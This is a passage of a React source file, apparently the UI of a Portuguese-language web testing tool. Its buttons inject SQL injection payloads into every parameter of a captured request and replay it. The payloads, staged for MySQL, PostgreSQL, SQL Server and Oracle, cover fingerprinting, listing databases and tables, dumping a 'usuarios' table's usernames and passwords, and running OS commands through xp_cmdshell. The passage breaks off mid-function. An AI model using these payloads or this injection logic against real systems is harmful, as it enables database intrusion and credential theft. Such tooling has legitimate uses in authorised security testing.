                      {selectedRequest && (
                        <button onClick={() => {
                          let newUrl = selectedRequest.url
                          let newBody = selectedRequest.body || ''
                          
                          if (newUrl.includes('?')) {
                            newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--`)
                          }
                          if (newBody.includes('=')) {
                            newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--`)
                          }
                          
                          setReplayUrl(newUrl)
                          setReplayBody(newBody)
                          setReplayMethod(selectedRequest.method)
                          setReplayHeaders(formatHeaders(selectedRequest.headers))
                          setActiveTab('history')
                        }} className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 shrink-0">Testar</button>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            </section>

            <section className="border border-nova-border rounded-lg bg-nova-bg-secondary">
              <div className="px-4 py-2 border-b border-nova-border bg-nova-bg-secondary/50">
                <h3 className="font-semibold flex items-center gap-2 text-nova-accent">
                  <Play size={14} />
                  Testes Automatizados - Extração de Dados do Banco
                </h3>
              </div>
              <div className="p-4 space-y-4">
                
                {/* Card 1: Detecção e Fingerprint */}
                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-4">
                  <h4 className="font-semibold text-nova-text mb-3 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-yellow-500" />
                    Fase 1: Detecção e Fingerprint do Banco
                  </h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">MySQL / MariaDB</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payloads = [
                              `' OR SLEEP(3)-- -`,
                              `' UNION SELECT @@version,2,3-- -`,
                              `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -`,
                            ]
                            const payload = payloads[0]
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-yellow-500/10 text-yellow-400 rounded text-[10px] hover:bg-yellow-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' OR SLEEP(3)-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' OR SLEEP(3)-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT @@version,2,3-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT @@version,2,3-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' AND 1=1-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' AND 1=1-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' AND 1=2-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' AND 1=2-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">PostgreSQL</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payloads = [
                              `' OR PG_SLEEP(3)--`,
                              `' UNION SELECT version(),2,3--`,
                              `' AND 1=CAST((SELECT version()) AS integer)--`,
                            ]
                            const payload = payloads[0]
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-yellow-500/10 text-yellow-400 rounded text-[10px] hover:bg-yellow-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' OR PG_SLEEP(3)--</code>
                          <button onClick={() => navigator.clipboard.writeText("' OR PG_SLEEP(3)--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT version(),2,3--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT version(),2,3--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' AND 1=CAST((SELECT version()) AS integer)--</code>
                          <button onClick={() => navigator.clipboard.writeText("' AND 1=CAST((SELECT version()) AS integer)--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">SQL Server</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "'; WAITFOR DELAY '0:0:3'--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-yellow-500/10 text-yellow-400 rounded text-[10px] hover:bg-yellow-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">'; WAITFOR DELAY '0:0:3'--</code>
                          <button onClick={() => navigator.clipboard.writeText("'; WAITFOR DELAY '0:0:3'--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">'; SELECT @@version--</code>
                          <button onClick={() => navigator.clipboard.writeText("'; SELECT @@version--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">'; EXEC xp_cmdshell 'whoami'--</code>
                          <button onClick={() => navigator.clipboard.writeText("'; EXEC xp_cmdshell 'whoami'--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">Oracle</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' OR 1=1--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-yellow-500/10 text-yellow-400 rounded text-[10px] hover:bg-yellow-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' OR 1=1--</code>
                          <button onClick={() => navigator.clipboard.writeText("' OR 1=1--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT banner,NULL FROM v$version--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT banner,NULL FROM v$version--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Card 2: Extrair Nome do Banco e Schema */}
                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-4">
                  <h4 className="font-semibold text-nova-text mb-3 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-blue-500" />
                    Fase 2: Extrair Nome do Banco e Estrutura
                  </h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">MySQL - Bancos</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT schema_name,2,3 FROM information_schema.schemata-- -"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT schema_name,2,3 FROM information_schema.schemata-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT schema_name,2,3 FROM information_schema.schemata-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT DATABASE(),2,3-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT DATABASE(),2,3-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">PostgreSQL - Bancos</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT datname,2,3 FROM pg_database--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT datname,2,3 FROM pg_database--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT datname,2,3 FROM pg_database--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT current_database(),2,3--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT current_database(),2,3--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">SQL Server - Bancos</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "'; SELECT name FROM sys.databases--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">'; SELECT name FROM sys.databases--</code>
                          <button onClick={() => navigator.clipboard.writeText("'; SELECT name FROM sys.databases--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">'; SELECT DB_NAME()--</code>
                          <button onClick={() => navigator.clipboard.writeText("'; SELECT DB_NAME()--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">Oracle - Bancos</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT name,2,3 FROM v$database--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT name,2,3 FROM v$database--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT name,2,3 FROM v$database--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT ora_database_name,2,3 FROM dual--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT ora_database_name,2,3 FROM dual--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Card 3: Extrair Tabelas */}
                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-4">
                  <h4 className="font-semibold text-nova-text mb-3 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-purple-500" />
                    Fase 3: Listar Tabelas do Banco
                  </h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">MySQL - Tabelas</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-[10px] hover:bg-purple-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">PostgreSQL - Tabelas</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT tablename,2,3 FROM pg_tables WHERE schemaname='public'--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-[10px] hover:bg-purple-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT tablename,2,3 FROM pg_tables WHERE schemaname='public'--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT tablename,2,3 FROM pg_tables WHERE schemaname='public'--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">SQL Server - Tabelas</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "'; SELECT table_name FROM information_schema.tables--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-[10px] hover:bg-purple-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">'; SELECT table_name FROM information_schema.tables--</code>
                          <button onClick={() => navigator.clipboard.writeText("'; SELECT table_name FROM information_schema.tables--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">Oracle - Tabelas</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT table_name,2,3 FROM user_tables--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-purple-500/10 text-purple-400 rounded text-[10px] hover:bg-purple-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT table_name,2,3 FROM user_tables--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT table_name,2,3 FROM user_tables--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Card 4: Extrair Colunas e Dados */}
                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-4">
                  <h4 className="font-semibold text-nova-text mb-3 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-green-500" />
                    Fase 4: Extrair Colunas e Dados das Tabelas
                  </h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">MySQL - Colunas</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'-- -"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-green-500/10 text-green-400 rounded text-[10px] hover:bg-green-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2 mt-2">
                          <span className="text-[10px] text-nova-text-secondary">Exemplo: dump de dados</span>
                          <button 
                            onClick={() => {
                              if (!selectedRequest) return
                              const payload = "' UNION SELECT id,usuario,senha FROM usuarios-- -"
                              let newUrl = selectedRequest.url
                              let newBody = selectedRequest.body || ''
                              if (newUrl.includes('?')) {
                                newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                              }
                              if (newBody.includes('=')) {
                                newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                              }
                              setReplayUrl(newUrl)
                              setReplayBody(newBody)
                              setReplayMethod(selectedRequest.method)
                              setReplayHeaders(formatHeaders(selectedRequest.headers))
                              setActiveTab('history')
                            }}
                            className="px-2 py-1 bg-green-500/10 text-green-400 rounded text-[10px] hover:bg-green-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                          >
                            Testar
                          </button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">PostgreSQL - Colunas</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-green-500/10 text-green-400 rounded text-[10px] hover:bg-green-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">SQL Server - Colunas</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
